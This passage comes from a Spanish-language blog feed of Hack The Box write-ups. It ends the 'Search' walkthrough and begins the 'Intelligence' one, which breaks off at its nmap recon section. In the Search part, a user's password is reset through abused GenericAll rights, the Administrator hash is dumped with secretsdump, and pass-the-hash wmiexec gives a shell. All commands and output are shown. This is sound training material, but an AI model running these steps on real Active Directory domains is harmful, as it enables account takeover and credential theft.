&lt;p&gt;Como sabemos &lt;code&gt;BIR-ADFS-GMSA&lt;/code&gt; tiene permisos &lt;code&gt;GenericAll&lt;/code&gt; sobre &lt;code&gt;tristan.davies&lt;/code&gt;, segun la informaci√≥n que proporciona Bloodhound es posible realizar &lt;a href=&#34;https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast&#34;&gt;kerberoasting&lt;/a&gt; o &lt;a href=&#34;https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericall-on-user&#34;&gt;cambiar la contrase√±a del usuario&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Ya que tenemos acceso como &lt;code&gt;BIR-ADFS-GMSA&lt;/code&gt; realizamos un cambio de contrase√±a a tristan.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Invoke-Command -ScriptBlock &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; net user tristan.davies Password123! /domain &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; -ComputerName RESEARCH -Credential &lt;span class=&#34;nv&#34;&gt;$cred&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Observamos que el comando fue ejecutado exitosamente.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_604_083315.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tras ejecutar CrackMapExec vemos que tenemos acceso a todos los recursos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ crackmapexec smb search.htb -u tristan.davies -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; --shares
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ristan.davies:Password123! &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Enumerated shares
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         Share           Permissions     Remark
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         -----           -----------     ------
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         ADMIN$          READ,WRITE      Remote Admin
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         C$              READ,WRITE      Default share
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         CertEnroll      READ,WRITE      Active Directory Certificate Services share
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         helpdesk
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         IPC$            READ            Remote IPC
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         NETLOGON        READ,WRITE      Logon server share
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         RedirectedFolders$ READ,WRITE
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         SYSVOL          READ            Logon server share
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;administrator&#34;&gt;Administrator&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;secretsdump&lt;/code&gt; para obtener el hash del usuario Administrator.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ impacket-secretsdump tristan.davies:&lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt;@search.htb -just-dc-user Administrator
Impacket v0.9.24 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping Domain Credentials &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;id:rid:lmhash:nthash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:c870b887ebb9c0900fc3c1ef25e0592c4da89bf7eb1cf6d3064d44afb2dc86f9
Administrator:aes128-cts-hmac-sha1-96:07431caa0e0c70a2adc8f9ce43e181b1
Administrator:des-cbc-md5:52d02af1f2fba43e
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cleaning up...
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Finalmente utilizando &lt;code&gt;wmiexec&lt;/code&gt; logramos obtener una shell y la flag &lt;code&gt;root.tsxt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ impacket-wmiexec administrator@search.htb -hashes aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6
Impacket v0.9.24 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; SMBv3.0 dialect used
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Launching semi-interactive shell - Careful what you execute
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Press &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; extra shell commands
C:&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;whoami
search&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;dministrator

C:&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Users/Administrator/Desktop
C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;dir
 Volume in drive C has no label.
 Volume Serial Number is B8F8-6F48

 Directory of C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop

22/11/2021  21:21    &amp;lt;DIR&amp;gt;          .
22/11/2021  21:21    &amp;lt;DIR&amp;gt;          ..
09/04/2022  02:22                &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; root.txt
               &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; File&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; bytes
               &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; Dir&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   2,568,282,112 bytes free

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;type root.txt
284a14da6bec1277cd63ff3c81d18c2e

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/search/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/search/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>active directory</category>
            
          
            
              <category>crackmapexec</category>
            
          
            
              <category>IIS client certificate</category>
            
          
            
              <category>kerbrute</category>
            
          
            
              <category>password spraying</category>
            
          
            
              <category>bloodhound</category>
            
          
            
              <category>bloodhound.py</category>
            
          
            
              <category>kerberoasting</category>
            
          
            
              <category>xlsx2csv</category>
            
          
            
              <category>powershell-web</category>
            
          
            
              <category>gmsa</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Intelligence</title>
        <link>https://sckull.github.io/posts/intelligence/</link>
        <pubDate>Sat, 27 Nov 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 27 Nov 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/intelligence/</guid>
        <description>En Intelligence realizamos una enumeracion de usuarios en los metadatos de PDFs para luego realizar &amp;lsquo;Password Spraying&amp;rsquo; lo que nos dio acceso a un primer usuario.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/intelligence/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;En Intelligence realizamos una enumeracion de usuarios en los metadatos de PDFs para luego realizar &amp;lsquo;Password Spraying&amp;rsquo; lo que nos dio acceso a un primer usuario. Encontramos un script en un recurso de samba lo que nos permiti√≥ obtener el hash de un segundo usuario tras ejecutar Responder y krbrelayx. Bloodhound nos mostr√≥ que uno de los usuarios tiene la caracteristica de leer constrase√±as de cuentas gMSA, este ultimo tambien tiene caracteristicas &amp;lsquo;Delegation&amp;rsquo; sobre el DC, con esta informacion obtuvimos acceso como administrador con gMSADumper y impacket.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/357&#34;&gt;Intelligence&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.248&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/22435&#34;&gt;Micah&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/22435&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[7.2, 6.5, 4.9, 5.1, 3.5],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[5, 5, 5, 5, 5],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;nmap&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (80), kerberos (88), ldap (389, 636, 3268, 3269), dns (53), winrm (5985), smb (139, 445).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
